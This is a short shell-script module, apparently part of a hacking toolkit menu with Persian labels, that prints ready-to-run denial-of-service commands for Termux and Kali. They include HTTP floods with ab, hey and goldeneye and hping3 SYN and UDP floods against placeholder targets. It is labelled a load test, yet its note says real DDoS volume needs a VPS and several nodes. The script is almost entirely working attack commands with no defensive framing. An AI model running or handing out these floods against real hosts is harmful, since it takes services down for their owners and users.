DESC="تست بار و اختلال"
REQ="ab / hping3 / goldeneye"
RISK="MED"
NOTE="حجم واقعی DDoS از یک لپ‌تاپ درنمی‌آید؛ برای آن VPS و چند نود لازم است"

termux(){ echo "pkg install apache2; ab -n 2000 -c 50 https://<TARGET>/"; }

kali(){
cat <<'EOF'
# لایه ۷:
ab -n 5000 -c 100 https://<TARGET>/
hey -n 5000 -c 100 https://<TARGET>/
# goldeneye:
python3 goldeneye.py https://<TARGET> -w 100 -s 500

# لایه ۴ (SYN flood):
sudo hping3 -S --flood -V -p 443 <IP>
# UDP flood:
sudo hping3 --udp -p 80 --flood <IP>
EOF
}
